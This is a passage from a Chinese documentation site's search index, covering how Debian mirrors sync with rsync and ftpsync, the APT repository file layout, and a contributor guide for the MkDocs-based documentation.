<p>\u6570\u636e\u53d8\u5316\uff1a\u6587\u4ef6\u5217\u8868\u4f20\u8f93\u5b8c\u6210\u540e\uff0c\u6587\u4ef6\u5f00\u59cb\u4f20\u8f93\u524d</p> <ul> <li>\u65b0\u589e\u6587\u4ef6\uff1a\u5ffd\u7565\u3002</li> <li>\u5220\u9664\u6587\u4ef6\uff1a\u9000\u51fa\uff0c\u8fd4\u56de\u503c <code>24 Partial transfer due to vanished source files</code>\u3002</li> <li>\u6587\u4ef6\u5185\u5bb9\u53d8\u5316\uff1a\u4e0d\u5f71\u54cd\uff0c\u4f46\u4f1a\u9020\u6210\u5168\u5c40\u89c6\u89d2\u4e0b\u7684\u4e0d\u4e00\u81f4\uff0c\u5373\u6b64\u6b21 Rsync \u540e\uff0c\u90e8\u5206\u6587\u4ef6\u4e3a\u65b0\u7248\uff0c\u90e8\u5206\u6587\u4ef6\u4e3a\u65e7\u7248\u3002</li> </ul> <p>\u540c\u6b65\u8fc7\u7a0b\u4e2d\u5e94\u5f53\u907f\u514d\u6587\u4ef6\u53d8\u5316\u3002</p> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#apt","title":"APT","text":"<p>Quote</p> <ul> <li>DebianRepositoryFormat - Debian Wiki\uff1aDebian \u8f6f\u4ef6\u4ed3\u5e93\u683c\u5f0f\uff0c\u8be6\u7ec6\u5730\u63cf\u8ff0\u4e86\u5176\u4e2d\u7684\u6bcf\u79cd\u6587\u4ef6\u3002</li> <li>Setting up a Debian archive mirror - Debian Wiki\uff1a\u5982\u4f55\u5efa\u7acb Debian \u955c\u50cf\u7ad9\u3002</li> </ul> <p><code>sources.list</code> \u683c\u5f0f\uff1a</p> <pre><code>type uri distribution component1 component2 component3 [..] componentX\n</code></pre> <p>APT \u9996\u5148\u4ece <code>$URI/dists/$DISTRIBUTION</code> \u4e0b\u8f7d <code>InRelease</code> \u6216 <code>Release</code> \u6587\u4ef6\u3002\u524d\u8005\u6587\u4ef6\u5185\u7b7e\u540d\uff0c\u540e\u8005\u9700\u8981\u4f7f\u7528 <code>Release.gpg</code> \u9a8c\u8bc1\u3002<code>Release</code> \u6587\u4ef6\u5217\u51fa\u4e86\u8be5 <code>$DISTRIBUTION</code> \u7684\u7d22\u5f15\u6587\u4ef6\u53ca\u5176\u54c8\u5e0c\u503c\uff1a</p> Release\uff08\u90e8\u5206\uff09<pre><code>Suite: unstable\nCodename: sid\nDate: Thu, 26 Sep 2024 08:17:58 UTC\nValid-Until: Thu, 03 Oct 2024 08:17:58 UTC\nArchitectures: all amd64 arm64 armel armhf i386 mips64el ppc64el riscv64 s390x\nComponents: main contrib non-free-firmware non-free\nMD5Sum:\n 7f8beaf99c34820e69778ea792c2d338  5312136 contrib/Contents-all\n e941316dc5a3e703335083e7b659b387    63339 contrib/Contents-all.diff/Index\n</code></pre> <p>\u63a5\u4e0b\u6765 APT \u5728 <code>$URI/dists/$DISTRIBUTION/$COMPONENT</code> \u4e0b\u8f7d\u7d22\u5f15\u6587\u4ef6\uff0c\u6bd4\u5982 <code>binary-$ARCH/Packages.xz</code>\u3001<code>source/Sources.xz</code>\u3002\u7d22\u5f15\u6587\u4ef6\u5217\u51fa\u4e86\u8f6f\u4ef6\u5305\u7684\u8def\u5f84\u53ca\u5176\u54c8\u5e0c\u503c\u3002\u4f8b\u5982\uff0c\u4e0b\u9762\u7684 <code>Sources</code> \u6587\u4ef6\u5217\u51fa\u4e86 <code>0ad</code> \u8f6f\u4ef6\u5305\u7684\u8def\u5f84\u548c\u54c8\u5e0c\u503c\uff1a</p> Sources\uff08\u90e8\u5206\uff09<pre><code>Package: 0ad\nBinary: 0ad\nArchitecture: amd64 arm64 armhf i386 kfreebsd-amd64 kfreebsd-i386\nFiles:\n 4d5f452a06bcdba6907f3350219a63db 2565 0ad_0.0.26-3.dsc\nChecksums-Sha256:\n c2d4b91d9d20a27b4989495d3b370635e79e2f7a4ed1f9031abc89e9c1d50952 2565 0ad_0.0.26-3.dsc\nPackage-List:\n 0ad deb games optional arch=amd64,arm64,armhf,i386,kfreebsd-amd64,kfreebsd-i386\nDirectory: pool/main/0/0ad\n</code></pre> <p>\u8f6f\u4ef6\u5305\u90fd\u4fdd\u5b58\u5728 <code>$URI/pool/$COMPONENT</code> \u4e0b\uff0c\u6309\u7167\u9996\u5b57\u6bcd\u5206\u76ee\u5f55\u5b58\u653e\u3002\u4e00\u4e9b\u5e38\u89c1\u7684\u6587\u4ef6\uff1a</p> <ul> <li><code>.deb</code>\uff1a\u4e8c\u8fdb\u5236\u5305</li> <li> <p><code>.dsc</code>\uff1a\u6e90\u7801\u5305\u63cf\u8ff0\u6587\u4ef6\uff0c\u6307\u5b9a\u54ea\u4e9b\u6587\u4ef6\u7ec4\u6210\u6e90\u7801\u5305\u3002\u4e00\u822c\u662f <code>.orig.tar</code>\u3001<code>.debian.tar</code>\u3002\u4f8b\u5982\uff1a</p> 0ad_0.0.23.1-5.dsc\uff08\u90e8\u5206\uff09<pre><code>Checksums-Sha1:\n3c6bb8924d65d17200e6b9475101e7d04f5db13a 31922812 0ad_0.0.23.1.orig.tar.xz\n85ac24b7b826f4345dc5dd4015256ce1eb0cab70 73620 0ad_0.0.23.1-5.debian.tar.xz\nChecksums-Sha256:\n01bff7641ee08cac896c54d518d7e4b01752513105558f212e3199d747512a37 31922812 0ad_0.0.23.1.orig.tar.xz\naff899c0b6a0c2ff746e051504a3e3ac7bb6070c21eb5a5ef5fb55d55391b0e0 73620 0ad_0.0.23.1-5.debian.tar.xz\nFiles:\n4fa111410ea55de7a013406ac1013668 31922812 0ad_0.0.23.1.orig.tar.xz\n43a5bf77192a8eebdbe763cdd1d72fa3 73620 0ad_0.0.23.1-5.debian.tar.xz\n</code></pre> </li> </ul> <code>pool</code> \u7684\u5386\u53f2 <p>\u66fe\u7ecf\uff0c\u8f6f\u4ef6\u5305\u6309 DISTRIBUTION \u5b58\u653e\u5728 <code>dists/</code> \u4e0b\uff0c\u9020\u6210\u4e86\u8f6f\u4ef6\u5305\u7684\u91cd\u590d\u5b58\u50a8\uff0c\u6bcf\u6b21\u53d1\u5e03\u65b0 DISTRIBUTION \u9700\u8981\u4f20\u8f93\u5927\u91cf\u6587\u4ef6\u3002<code>pool</code> \u76ee\u5f55\u7684\u5f15\u5165\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u5141\u8bb8\u591a\u4e2a DISTRIBUTION \u5171\u4eab\u8f6f\u4ef6\u5305\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#ftpsync","title":"<code>ftpsync</code>","text":"<p>Quote</p> <ul> <li>Debian Mirror team / archvsync \u00b7 GitLab</li> </ul> <p>\u6240\u6709 Debian \u955c\u50cf\u7ad9\u90fd\u4f7f\u7528 <code>ftpsync</code> \u8fdb\u884c\u540c\u6b65\uff0c\u5b83\u6267\u884c\u4e24\u9636\u6bb5\u540c\u6b65\uff1a</p> <ul> <li>\u7b2c\u4e00\u9636\u6bb5<ul> <li>\u5ffd\u7565\u7d22\u5f15\u6587\u4ef6\uff1a<code>Packages*</code>, <code>Sources*</code>, <code>Release*</code>\uff0c<code>InRelease</code>\u3002</li> <li>\u4e0d\u5220\u9664\u4efb\u4f55\u6587\u4ef6\u3002</li> </ul> </li> <li>\u7b2c\u4e8c\u9636\u6bb5<ul> <li>\u540c\u6b65\u7d22\u5f15\u6587\u4ef6\u3002</li> <li>\u5220\u9664\u4e0d\u5728 mirror \u4e2d\u7684\u6587\u4ef6\u3002</li> </ul> </li> </ul> <p>\u4e5f\u5c31\u662f\u5148\u540c\u6b65\u518d\u7d22\u5f15\uff0c\u9632\u6b62\u7d22\u5f15\u5230\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002</p> <p><code>ftpsync</code> \u652f\u6301\u4ece\u591a\u4e2a archive \u540c\u6b65\u3002Debian \u7f51\u7edc\u4e2d\u901a\u7528\u7684 archive \u6709\uff1a</p> <ul> <li>standard debian archive: default empty $ARCHIVE (ftpsync.conf)</li> <li>debian-ports archive:  ARCHIVE=ports (ftpsync-ports.conf)</li> <li>debian-security archive: ARCHIVE=security (ftpsync-security.conf)</li> </ul> <p>\u6709\u4e86\u4e0a\u9762\u7684\u77e5\u8bc6\uff0c\u6211\u4eec\u5c31\u80fd\u7406\u89e3 <code>ftpsync</code> \u7684\u547d\u4ee4\u884c\u9009\u9879\u4e86\uff1a</p> Option Behaviour stage1 Only do stage1 sync stage2 Only do stage2 sync all Do a complete sync (default) mhop Do a multi-hop sync archive:foo Sync archive foo (if the file $HOME/etc/ftpsync-foo.conf exists and is configured) callback Call back when done (needs proper ssh setup for this to work). It will always use the \"command\" callback:$HOSTNAME where $HOSTNAME is the one defined in config and will happen before slave mirrors are triggered. <p>\u63a5\u4e0b\u6765\u9605\u8bfb <code>ftpsync</code> \u6e90\u7801\u3002</p> <ul> <li>\u89e3\u6790\u547d\u4ee4\u884c\u53c2\u6570</li> <li> <p>\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6</p> <pre><code>read_config() {\nlocal name=$(echo \"$1\" | sed -e 's/[^A-Za-z0-9._-]/_/g')\nlocal config=$(search_config \"$name\")\nif [ \"$config\" ]; then\n    . \"$config\"\n    CURRENT_CONFIG=\"$config\"\n    return 0\nelse\n    echo \"Can't read config file ${name}!\" &gt;&amp;2\n    exit 78 # EX_CONFIG\nfi\n}\n</code></pre> <p>\u914d\u7f6e\u6587\u4ef6\u5927\u6982\u957f\u8fd9\u6837\uff1a</p> <pre><code>MIRRORNAME=`hostname -f`\nTO=\"/srv/mirrors/debian/\"\nMAILTO=\"$LOGNAME\"\nHUB=false\n</code></pre> <p>\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 <code>.</code> \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u3002</p> </li> <li> <p>\u8bbe\u7f6e <code>rsync</code> \u9009\u9879</p> <pre><code>RSYNC=${RSYNC:-rsync}\nRSYNC_PROTOCOL=$(rsync_protocol)\nRSYNC_EXTRA=${RSYNC_EXTRA:-\"\"}\nRSYNC_BW=${RSYNC_BW:-0}\nif [[ $RSYNC_PROTOCOL -ge 31 ]]; then\n    RSYNC_OPTIONS=${RSYNC_OPTIONS:-\"-prltvHSB8192 --safe-links --chmod=D755,F644 --timeout 120 --stats --no-human-readable --no-inc-recursive\"}\nelse\n    RSYNC_OPTIONS=${RSYNC_OPTIONS:-\"-prltvHSB8192 --safe-links --timeout 120 --stats --no-human-readable --no-inc-recursive\"}\nfi\nRSYNC_OPTIONS1=${RSYNC_OPTIONS1:-\"--include=*.diff/ --include=by-hash/ --exclude=*.diff/Index --exclude=Contents*--exclude=Packages* --exclude=Sources*--exclude=Release* --exclude=InRelease --exclude=i18n/*--exclude=dep11/* --exclude=installer-*/current --exclude=ls-lR*\"}\nRSYNC_OPTIONS2=${RSYNC_OPTIONS2:-\"--max-delete=40000 --delay-updates --delete --delete-delay --delete-excluded\"}\n</code></pre> <p><code>RSYNC_OPTIONS</code> \u5305\u542b\u4ee5\u4e0b\u9009\u9879\uff08\u53c2\u8003 rsync(1)\uff09\uff1a</p> <ul> <li><code>-p</code>\uff1a\u4fdd\u7559\u6587\u4ef6\u6743\u9650\u3002</li> <li><code>-r</code>\uff1a\u9012\u5f52\u590d\u5236\u76ee\u5f55\u3002</li> <li><code>-l</code>\uff1a\u4fdd\u7559\u7b26\u53f7\u94fe\u63a5\u3002</li> <li><code>-t</code>\uff1a\u4fdd\u7559\u6587\u4ef6\u4fee\u6539\u65f6\u95f4\u3002</li> <li><code>-v</code>\uff1a\u663e\u793a\u8be6\u7ec6\u4fe1\u606f\uff08verbose\uff09\u3002</li> <li><code>-H</code>\uff1a\u4fdd\u7559\u786c\u94fe\u63a5\u3002</li> <li> <p><code>-S</code>\uff1a\u9ad8\u6548\u5730\u590d\u5236\u7a00\u758f\u6587\u4ef6\u3002</p> <p>turn sequences of nulls into sparse blocks</p> <p>Try to handle sparse files efficiently so they take up less space on the destination.</p> <p>\u4e86\u89e3\u8fc7\u6587\u4ef6\u7cfb\u7edf\u7684\u540c\u5b66\u6216\u8bb8\u4f1a\u77e5\u9053\u7a00\u758f\u5757\u7684\u6982\u5ff5\u3002</p> </li> <li> <p><code>-B8192</code>\uff1a\u8bbe\u7f6e\u5757\u5927\u5c0f\u4e3a 8192 \u5b57\u8282\uff0c\u7528\u4e8e\u589e\u91cf\u4f20\u8f93\u3002</p> <p>This forces the block size used in rsync's delta-transfer algorithm to a fixed value.</p> <p>\u5728 rsync \u4f20\u8f93\u6587\u4ef6\u65f6\uff0c\u5b83\u4f7f\u7528\u4e86 delta algorithm\uff08\u589e\u91cf\u7b97\u6cd5\uff09\u6765\u5c3d\u53ef\u80fd\u53ea\u4f20\u8f93\u6e90\u6587\u4ef6\u548c\u76ee\u6807\u6587\u4ef6\u4e4b\u95f4\u7684\u5dee\u5f02\uff0c\u800c\u4e0d\u662f\u6574\u4e2a\u6587\u4ef6\u3002\u8fd9\u4e2a\u7b97\u6cd5\u5c06\u6587\u4ef6\u5212\u5206\u4e3a\u591a\u4e2a\u5c0f\u5757\uff0c\u5e76\u6839\u636e\u8fd9\u4e9b\u5757\u7684\u5185\u5bb9\u751f\u6210\u6821\u9a8c\u548c\uff0c\u7136\u540e\u901a\u8fc7\u6bd4\u8f83\u8fd9\u4e9b\u6821\u9a8c\u548c\uff0c\u8bc6\u522b\u54ea\u4e9b\u5757\u9700\u8981\u4f20\u8f93\u3002</p> </li> <li> <p><code>--safe-links</code>\uff1a\u5ffd\u7565\u6307\u5411\u5916\u90e8\u76ee\u5f55\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u4fdd\u8bc1\u5b89\u5168\u3002</p> </li> <li><code>--chmod=D755,F644</code>\uff1a\u8bbe\u7f6e\u76ee\u5f55\u6743\u9650\u4e3a 755\uff0c\u6587\u4ef6\u6743\u9650\u4e3a 644\u3002</li> <li><code>--timeout=120</code>\uff1a\u8d85\u65f6\u65f6\u95f4\u4e3a 120 \u79d2\u3002</li> <li><code>--stats</code>\uff1a\u5728\u4f20\u8f93\u5b8c\u6210\u540e\u663e\u793a\u7edf\u8ba1\u4fe1\u606f\u3002</li> <li><code>--no-human-readable</code>\uff1a\u5728\u7edf\u8ba1\u8f93\u51fa\u4e2d\u4e0d\u4ee5\u4eba\u7c7b\u53ef\u8bfb\u7684\u683c\u5f0f\u663e\u793a\u5927\u5c0f\u548c\u901f\u5ea6\u3002</li> <li> <p><code>--no-inc-recursive</code>\uff1a\u4e0d\u4f7f\u7528\u589e\u91cf\u9012\u5f52\u7b97\u6cd5\uff0c\u9002\u5408\u5927\u6570\u636e\u4f20\u8f93\u65f6\u7684\u7a33\u5b9a\u6027\u3002</p> <p>This makes rsync scan the full file list before it begins to transfer files. See <code>--inc-recursive</code> for more info.</p> </li> </ul> <p><code>RSYNC_OPTIONS2</code>\uff1a\u4e3b\u8981\u7528\u4e8e\u5220\u9664\u6587\u4ef6\u7684\u76f8\u5173\u9009\u9879\uff1a</p> <ul> <li><code>--max-delete=40000</code>\uff1a\u4e00\u6b21\u6700\u591a\u5220\u9664 40000 \u4e2a\u6587\u4ef6\uff0c\u9650\u5236\u5220\u9664\u64cd\u4f5c\u7684\u6570\u91cf\u3002</li> <li><code>--delay-updates</code>\uff1a\u5728\u6240\u6709\u6587\u4ef6\u4f20\u8f93\u5b8c\u6210\u540e\u518d\u66f4\u65b0\u76ee\u6807\u6587\u4ef6\uff0c\u51cf\u5c11\u4e34\u65f6\u4e0d\u4e00\u81f4\u7684\u65f6\u95f4\u3002</li> <li><code>--delete</code>\uff1a\u5728\u76ee\u6807\u76ee\u5f55\u4e2d\u5220\u9664\u6e90\u76ee\u5f55\u4e2d\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\uff08\u4e0e\u540c\u6b65\u65f6\u4fdd\u6301\u4e00\u81f4\uff09\u3002</li> <li><code>--delete-delay</code>\uff1a\u5ef6\u8fdf\u6587\u4ef6\u5220\u9664\u64cd\u4f5c\uff0c\u76f4\u5230\u4f20\u8f93\u5b8c\u6210\u3002</li> <li><code>--delete-excluded</code>\uff1a\u5220\u9664\u90a3\u4e9b\u88ab\u6392\u9664\u7684\u6587\u4ef6\u3002</li> </ul> </li> <li> <p>\u9501\u6587\u4ef6\u548c\u540c\u6b65\u6807\u8bb0</p> <pre><code># Our trace and lock files\nLOCK_NAME=\"Archive-Update-in-Progress-${MIRRORNAME}\"\nLOCK=\"${TO}/${LOCK_NAME}\"\nUPDATEREQUIRED_NAME=\"Archive-Update-Required-${MIRRORNAME}\"\nUPDATEREQUIRED=\"${TO}/${UPDATEREQUIRED_NAME}\"\n# Used to make sure we will have the archive fully and completly synced before\n# we stop, even if we get multiple pushes while this script is running\n# Otherwise we can end up with a half-synced archive\n# - get a push\n# - sync, while locked\n# - get another push. Of course no extra sync run then happens, we are locked\n# - done. Archive not correctly synced, we don't have all the changes from the second push\ntouch \"${UPDATEREQUIRED}\"\n</code></pre> <p>\u540c\u6b65\u6807\u8bb0\u4e3b\u8981\u662f\u7528\u4e8e\u8bb0\u5f55\u65b0\u7684\u63a8\u9001\u5e76\u5728\u4e0b\u9762\u7684\u5faa\u73af\u4e2d\u5904\u7406\uff0c\u5426\u5219 <code>ftpsync</code> \u540c\u6b65\u8fc7\u7a0b\u4e2d\u6536\u5230\u7684\u63a8\u9001\u4f1a\u56e0\u4e3a\u9501\u800c\u88ab\u5ffd\u7565\u3002</p> </li> <li> <p>\u4f7f\u7528\u9501\u68c0\u67e5\u662f\u5426\u6709\u5176\u4ed6 <code>rsync</code> \u6b63\u5728\u5de5\u4f5c</p> </li> <li> <p>\u8fd0\u884c <code>rsync</code>\uff0c\u4ee5\u8fd9\u4e2a\u5927\u5faa\u73af\u4e3a\u4e3b\u4f53\uff1a</p> <pre><code>while [[ -e ${UPDATEREQUIRED} ]]; do\n</code></pre> <ul> <li> <p>\u7b2c\u4e00\u9636\u6bb5\uff1a</p> <pre><code>run_rsync \"stage1\" ${RSYNC_OPTIONS1} || result=$?\n</code></pre> </li> <li> <p>\u7b2c\u4e8c\u9636\u6bb5\uff1a\u9996\u5148\u786e\u4fdd\u4e0a\u6e38\u955c\u50cf\u7ad9\u5df2\u7ecf\u5b8c\u6210\u540c\u6b65\uff0c\u7136\u540e\u518d\u8fdb\u884c\u540c\u6b65</p> <pre><code>for aupfile in \"${TO}/Archive-Update-in-Progress-\"*; do\n    case \"$aupfile\" in\n    *)\n        if [[ -f $aupfile ]]; then\n            # Remove the file, it will be synced again if\n            # upstream is still not done\n            rm -f \"$aupfile\"\n        fi\n        upstream_uip=true\n        ;;\n    esac\ndone\nif [[ true = ${upstream_uip} ]]; then\n    log \"Upstream archive update in progress, skipping stage2\"\n    if [[ ${UPDATE_RETRIES} -lt ${UIPRETRIES} ]]; then\n        log \"Retrying update in ${UIPSLEEP}\"\n        sleep \"${UIPSLEEP}\"\n    fi\nelse\n    # We are lucky, it worked. Now do step 2 and sync again, this time including\n    # the packages/releases files\n    run_rsync \"stage2\" ${RSYNC_OPTIONS2} || result=$?\nfi\n</code></pre> </li> </ul> </li> <li> <p>\u66f4\u65b0 trace \u6587\u4ef6</p> </li> <li> <p>\u53bb\u9664\u9501</p> <pre><code># Remove the Archive-Update-in-Progress file before we push our downstreams.\nrm -f \"${LOCK}\"\n</code></pre> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"index/contribute/","title":"\u8d21\u732e","text":""},{"location":"index/contribute/#\u8d21\u732e","title":"\u8d21\u732e","text":"<p>\u6211\u4eec\u6b22\u8fce\u4efb\u4f55\u4eba\u53c2\u4e0e\u6587\u6863\u5efa\u8bbe\uff01</p> <p>\u8d21\u732e\u65b9\u5f0f\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ol> <li>\u53d1\u73b0\u6587\u6863\u4e2d\u7684\u9519\u8bef\u5e76\u63d0\u51fa\u4fee\u6b63</li> <li>\u8865\u5145\u73b0\u6709\u6587\u6863\u7684\u5185\u5bb9</li> <li>\u64b0\u5199\u65b0\u7684\u6280\u672f\u6587\u6863\u6216\u6559\u7a0b</li> <li>\u4f18\u5316\u6587\u6863\u7684\u7ec4\u7ec7\u7ed3\u6784\u548c\u53ef\u8bfb\u6027</li> </ol>"},{"location":"index/contribute/#-\u672c\u5730\u6784\u5efa","title":"\ud83d\ude80 \u672c\u5730\u6784\u5efa","text":"<p>\u672c\u6587\u6863\u4f7f\u7528 Material for MkDocs \u6784\u5efa\u3002Clone \u672c\u4ed3\u5e93\u540e\uff0c\u4f60\u53ef\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u5728\u672c\u5730\u542f\u52a8\u6587\u6863\u670d\u52a1\uff1a</p> <pre><code>pip install -r requirements.txt\nmkdocs serve\n</code></pre>"},{"location":"index/contribute/#-\u5199\u4f5c\u89c4\u8303","title":"\u270d\ufe0f \u5199\u4f5c\u89c4\u8303","text":"<p>\ud83d\udca1 \u6211\u4eec\u9f13\u52b1\u4e2a\u6027\u5316\u5199\u4f5c\uff0c\u4ee5\u4e0b\u89c4\u8303\u4ec5\u4e3a\u4fdd\u8bc1\u57fa\u7840\u4e00\u81f4\u6027</p> <p>\u2705 \u63a8\u8350\uff1a</p> <ul> <li>\u4f7f\u7528 Markdown \u683c\u5f0f</li> <li>\u4f7f\u7528 EditorConfig \u7edf\u4e00\u4ee3\u7801\u98ce\u683c</li> <li>\u4f7f\u7528 Markdownlint \u683c\u5f0f\u5316\u6587\u6863</li> <li>\u4f7f\u7528 AutoCorrect \u4f18\u5316\u4e2d\u82f1\u6587\u6df7\u6392</li> <li>\u6807\u6ce8\u53c2\u8003\u8d44\u6599\u6765\u6e90</li> <li>\u6e05\u6670\u7684 Git \u63d0\u4ea4\u4fe1\u606f</li> <li>\u9002\u5f53\u4f7f\u7528 emoji \u589e\u5f3a\u53ef\u8bfb\u6027</li> </ul> <p>\u274c \u907f\u514d\uff1a</p> <ul> <li>\u76f4\u63a5\u7c98\u8d34\u672a\u6d88\u5316\u7684\u5916\u90e8\u5185\u5bb9</li> <li>\u5305\u542b\u654f\u611f\u914d\u7f6e\u4fe1\u606f</li> <li>\u4f7f\u7528\u975e\u901a\u7528\u7f29\u5199</li> </ul>"},{"location":"index/contribute/#-git-\u534f\u4f5c","title":"\ud83d\udd27 Git \u534f\u4f5c","text":"<ul> <li>\u56e2\u961f\u6210\u5458\uff1a\u76f4\u63a5\u63d0\u4ea4\u5230 <code>main</code> \u5206\u652f\uff0c\u81ea\u884c\u5904\u7406\u51b2\u7a81\uff08\u63a8\u8350\u4f7f\u7528 <code>rebase</code>\uff09\u3002<ul> <li>\u5982\u679c\u9700\u8981\u63d0\u9192\u4ed6\u4eba\u5ba1\u9605\uff0c\u8bf7\u4f7f\u7528 Pull Request\u3002</li> <li>\u5982\u679c\u6709\u503c\u5f97\u8ba8\u8bba\u7684\u8bdd\u9898/\u9700\u8981\u5206\u914d\u4efb\u52a1\uff0c\u53ef\u4ee5\u4f7f\u7528 Issue \u529f\u80fd\u3002</li> </ul> </li> <li>\u56e2\u961f\u5916\u4eba\u5458\uff1a\u901a\u8fc7 GitHub \u63d0\u4ea4 Pull Request\u3002</li> </ul>"},{"location":"index/contribute/#-\u6587\u4ef6\u7ba1\u7406","title":"\ud83d\udcc1 \u6587\u4ef6\u7ba1\u7406","text":"<ul> <li> <p>\u6240\u6709\u9644\u4ef6\uff08\u56fe\u7247/\u4ee3\u7801\u7b49\uff09\u5b58\u653e\u5728\u540c\u540d <code>.assets</code> \u6587\u4ef6\u5939\u4e2d</p> <p>\u793a\u4f8b\uff1a<code>guide.md</code> \u7684\u9644\u4ef6\u653e\u5728 <code>guide.assets/</code></p> </li> </ul>"},{"location":"index/contribute/#-\u8bed\u8a00\u98ce\u683c","title":"\ud83c\udf10 \u8bed\u8a00\u98ce\u683c","text":"<ul> <li>\u4e3b\u8981\u4f7f\u7528\u4e2d\u6587</li> <li> <p>\u4e13\u4e1a\u672f\u8bed\u683c\u5f0f\uff1a</p> <pre><code>\u56fe\u5f62\u5904\u7406\u5668\uff08Graphics Processing Unit\uff0cGPU\uff09\n</code></pre> </li> </ul>"},{"location":"index/contribute/#-\u56fe\u7247\u89c4\u8303","title":"\ud83d\uddbc\ufe0f \u56fe\u7247\u89c4\u8303","text":"<p>\u5173\u4e8e draw.io \u56fe\u7247</p> <p>\u672c\u6587\u6863\u5df2\u542f\u7528 mkdocs-drawio \u63d2\u4ef6\uff0c\u80fd\u591f\u6e32\u67d3 <code>.drawio</code> \u6587\u4ef6\u3002</p> <pre><code>![\u793a\u4f8b\u56fe\u7247](path/to/image.drawio)\n</code></pre> <p>\u6211\u4eec\u63a8\u8350\u76f4\u63a5\u63d2\u5165 <code>.drawio</code> \u6587\u4ef6\uff0c\u4ee5\u4fbf\u540e\u7eed\u4fee\u6539\u3002</p> <p>\u4e3a\u4e86\u51cf\u5c0f\u56fe\u7247\u4f53\u79ef\uff0c\u5efa\u8bae\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u8f6c\u6362\u4e3a WebP \u683c\u5f0f\uff1a</p> <pre><code>for f in *.jpg *.jpeg *.png; do [ -f \"$f\" ] &amp;&amp; cwebp \"$f\" -o \"${f%.*}.webp\" &amp;&amp; rm \"$f\"; done\n</code></pre> <p>\u5982\u679c\u56fe\u7247\u9700\u8981\u5f15\u7528\u5907\u6ce8\u3001\u8bf4\u660e\u4fe1\u606f\u6216\u8c03\u6574\u7f29\u653e\u7b49\u6548\u679c\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 HTML \u683c\u5f0f\uff1a</p> <pre><code>&lt;figure markdown&gt;\n![\u793a\u4f8b\u56fe\u7247](path/to/image.png){ width=80% }\n&lt;figcaption&gt;\n  \u56fe\u7247\u8bf4\u660e&lt;br&gt;\n  &lt;small&gt;[\u6765\u6e90](https://example.com)&lt;/small&gt;\n&lt;/figcaption&gt;\n&lt;/figure&gt;\n</code></pre>"},{"location":"index/contribute/#-\u535a\u5ba2\u89c4\u8303","title":"\ud83d\udcdd \u535a\u5ba2\u89c4\u8303","text":"<p>\u672c\u6587\u6863\u5df2\u542f\u7528 Basic blogs - Material for MkDocs\u3002\u8981\u65b0\u589e\u535a\u5ba2\uff0c\u8bf7\u5728 <code>docs/blog/posts/&lt;year&gt;</code> \u76ee\u5f55\u4e0b\u521b\u5efa\u65b0\u7684 Markdown \u6587\u4ef6\uff0c\u547d\u540d\u4e3a <code>&lt;month&gt;-&lt;day&gt;-&lt;title&gt;.md</code>\uff0c\u5185\u5bb9\u53c2\u8003 <code>docs/blog/posts/.template.md</code>\u3002</p> <p>\u7136\u540e\u5728 <code>docs/blog/.authors.yml</code> \u4e2d\u6dfb\u52a0\u4f5c\u8005\u4fe1\u606f\u5373\u53ef\u3002</p>"},{"location":"index/contribute/#-\u6587\u6863\u72b6\u6001","title":"\ud83d\udcca \u6587\u6863\u72b6\u6001","text":"<p>\u4e0b\u9762\u662f\u6587\u6863 Tag\uff0c\u7528\u4e8e\u6807\u8bb0\u6587\u6863\u7684\u5b8c\u6210\u72b6\u6001\u3002</p> Tag \u8bf4\u660e <code>\u5b8c\u5584</code> \u5185\u5bb9\u5b8c\u6574\uff0c\u7b26\u5408\u5199\u4f5c\u89c4\u8303 <code>\u4e0d\u5b8c\u5584</code> \u5185\u5bb9\u4e0d\u5b8c\u6574\u6216\u6709\u8bef\uff0c\u4e0d\u7b26\u5408\u5199\u4f5c\u89c4\u8303 <code>\u5e9f\u5f03</code> \u5373\u5c06\u79fb\u9664 <p>\u8bf7\u8003\u8651\u4f18\u5148\u8d21\u732e\u88ab\u6807\u8bb0\u4e3a <code>\u4e0d\u5b8c\u5584</code> \u7684\u6587\u6863\u3002</p>"},{"location":"index/contribute/#tag:help","title":"help","text":"<ul> <li>            SNMP          </li> <li>            \u8eab\u4efd\u8ba4\u8bc1\u4e0e\u6388\u6743\uff1aNSS\u3001PAM \u548c SSSD          </li> </ul>"},{"location":"index/contribute/#tag:stable","title":"stable","text":"<ul> <li>            CI/CD \u5e73\u53f0\uff1aJenkins          </li> <li>            IPv6          </li> <li>            L2TP          </li> <li>            LLDP          </li> <li>            VLAN          </li> <li>            \u7f51\u7edc\u8fd0\u7ef4          </li> <li>            \u94fe\u8def\u805a\u5408          </li> </ul>"},{"location":"index/contribute/#tag:\u4e0d\u5b8c\u5584","title":"\u4e0d\u5b8c\u5584","text":"<ul> <li>            CUDA          </li> <li>            HIP          </li> <li>            Linux \u8bbe\u5907\u9a71\u52a8          </li> <li>            MPI          </li> <li>            OpenMP          </li> <li>            Others          </li> <li>            ZJU Git \u4ee3\u7801\u6258\u7ba1\u670d\u52a1          </li> <li>            ZJU Mirror \u5386\u53f2          </li> <li>            ZJU Mirror \u955c\u50cf\u7ad9          </li> <li>            \u4efb\u52a1\u8c03\u5ea6\uff1aSlurm          </li> <li>            \u4f18\u5316\u65b9\u5411\u6982\u8ff0          </li> <li>            \u5176\u4ed6          </li> <li>            \u5305\u7ba1\u7406\u5668\uff1aConda          </li> <li>            \u542f\u52a8\u8fc7\u7a0b          </li> <li>            \u5bb9\u5668          </li> <li>            \u5e76\u884c\u8ba1\u7b97          </li> <li>            \u5f15\u5bfc\u65b9\u5f0f\uff1aPXE          </li> <li>            \u6587\u4ef6\u7cfb\u7edf          </li> <li>            \u6838\u5fc3\u673a\u5236\uff1aNFS Root          </li> <li>            \u6a21\u578b          </li> <li>            \u6a21\u578b          </li> <li>            \u73af\u5883\u7ba1\u7406\uff1aLmod          </li> <li>            